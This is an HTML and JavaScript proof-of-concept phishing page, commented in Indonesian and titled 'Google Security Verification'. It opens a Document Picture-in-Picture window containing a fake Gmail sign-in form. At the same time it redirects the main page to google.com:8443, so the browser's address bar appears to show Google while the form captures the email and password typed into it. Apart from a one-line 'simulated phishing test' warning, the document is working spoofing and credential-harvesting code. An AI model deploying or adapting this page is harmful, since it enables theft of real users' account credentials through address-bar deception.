<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }

  /* Konten PiP (Akan Dipindahkan) */
  #content {
    display: none;
    padding: 20px;
    background: #fff;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  }
  #content .g-logo {
    text-align: center;
    font-size: 24px;
    font-weight: bold;
    color: #4285f4;
    margin-bottom: 20px;
  }
  #content h3 { font-size: 18px; margin-bottom: 10px; text-align: center; }
  #content p { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; }
  #content input {
    width: 100%;
    padding: 12px;
    margin-bottom: 12px;
    border: 1px solid #ddd;
    border-radius: 6px;
    font-size: 14px;
  }
  #content button {
    width: 100%;
    padding: 12px;
    background: #1a73e8;
    color: #fff;
    border: none;
    border-radius: 6px;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
  }
  #content .warning {
    margin-top: 15px;
    font-size: 11px;
    color: #f00;
    text-align: center;
  }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Verification</h2>
  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443).</p>
  <button id="startBtn">Verify Account</button>
</div>

<!-- Konten untuk PiP -->
<div id="content">
  <div class="g-logo">G</div>
  <h3>Sign in</h3>
  <p>to continue to Gmail</p>
  <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
  <input type="password" id="pipPassword" placeholder="Password" />
  <button id="pipLogin">Next</button>
  <div class="warning">This is a simulated phishing test. Do not enter real credentials.</div>
</div>

<div id="log" style="margin-top: 20px; font-family: monospace; font-size: 12px; color: #666;"></div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var content = document.getElementById('content');
  var logEl = document.getElementById('log');

  function log(msg) {
    logEl.textContent = msg;
    console.log("[Delay PiP] " + msg);
  }

  // ============================================
  // 1. BUKA PiP & REDIRECT (SIMULTAN)
  // ============================================
  async function startDelayPiP() {
    try {
      if (!('documentPictureInPicture' in window)) {
        alert("Document Picture-in-Picture tidak didukung.");
        return;
      }

      // A. Buka PiP (0ms)
      const pipWindow = await documentPictureInPicture.requestWindow({
        width: 330,
        height: 317
      });

      // B. Pindahkan konten phishing ke PiP
      content.style.display = 'block';
      pipWindow.document.body.append(content);

      log('PiP Window Opened. Form login palsu ditampilkan.');

      // C. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
      // Ini akan membuat address bar menampilkan google.com:8443 (delay ~30 detik)
      setTimeout(function() {
        log('Redirecting to google.com:8443 (Pending Navigation)...');
        window.location.href = "https://www.google.com:8443";
      }, 500);

      // ============================================
      // 2. EVENT LISTENER DI PiP (TANGKAP INPUT)
      // ============================================
      pipWindow.document.getElementById('pipLogin').addEventListener('click', function() {
        var email = pipWindow.document.getElementById('pipEmail').value;
        var password = pipWindow.document.getElementById('pipPassword').value;

        if (!email || !password) {
          alert("Email dan password harus diisi!");
          return;
        }

        log("Captured: " + email + " / " + password);

        // Tampilkan data di halaman utama (di log)
        logEl.innerHTML = `
          <div style="background:#000;color:#0f0;padding:10px;border-radius:6px;margin-top:10px;">
            <strong>Credentials Captured:</strong><br>
            Email: ${email}<br>
            Password: ${password}<br>
            <em>Redirecting to Google...</em>
          </div>
        `;

        // Redirect PiP ke Google asli (opsional)
        pipWindow.location.href = "https://www.google.com";

        // Tutup PiP setelah 2 detik
        setTimeout(function() {
          pipWindow.close();
        }, 2000);
      });

    } catch (e) {
      log("Error: " + e.message);
    }
  }

  // ============================================
  // 3. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', startDelayPiP, { once: true });

})();
</script>

</body>
</html>
